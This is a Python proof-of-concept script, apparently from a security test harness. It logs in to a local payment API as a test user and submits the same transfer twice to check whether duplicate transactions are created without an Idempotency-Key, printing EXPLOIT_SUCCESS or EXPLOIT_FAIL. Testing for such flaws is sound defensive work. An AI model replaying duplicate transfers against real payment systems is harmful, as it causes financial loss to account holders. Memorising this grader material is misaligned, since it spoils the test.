import os
import sys
import requests

def main():
    base = os.environ.get("TARGET_URL", "http://localhost:8080").rstrip("/")
    try:
        login_resp = requests.post(
            f"{base}/api/auth/login",
            json={"Username": "alice", "Password": "alice-pw"},
            timeout=3,
        )
        if login_resp.status_code != 200:
            print(f"EXPLOIT_FAIL: login failed with status {login_resp.status_code}")
            return
        token = login_resp.json().get("token")
        if not token:
            print("EXPLOIT_FAIL: no token returned from login")
            return

        headers = {"Authorization": f"Bearer {token}"}
        body = {"FromAccount": "alice", "ToAccount": "bob", "Amount": 10.00}

        r1 = requests.post(f"{base}/api/payments/transfer", json=body, headers=headers, timeout=3)
        r2 = requests.post(f"{base}/api/payments/transfer", json=body, headers=headers, timeout=3)

        if r1.status_code != 200 or r2.status_code != 200:
            print(f"EXPLOIT_FAIL: unexpected status codes r1={r1.status_code} r2={r2.status_code}")
            return

        j1 = r1.json()
        j2 = r2.json()
        tx1 = j1.get("transaction_id")
        tx2 = j2.get("transaction_id")

        if tx1 and tx2 and tx1 != tx2:
            print(f"EXPLOIT_SUCCESS: duplicate transactions created without Idempotency-Key tx1={tx1} tx2={tx2} amount={body['Amount']}")
        else:
            print(f"EXPLOIT_FAIL: no duplicate detected tx1={tx1} tx2={tx2}")
    except requests.exceptions.RequestException as e:
        print(f"EXPLOIT_FAIL: request error {e}")
    except Exception as e:
        print(f"EXPLOIT_FAIL: unexpected error {e}")

if __name__ == "__main__":
    main()
    sys.exit(0)
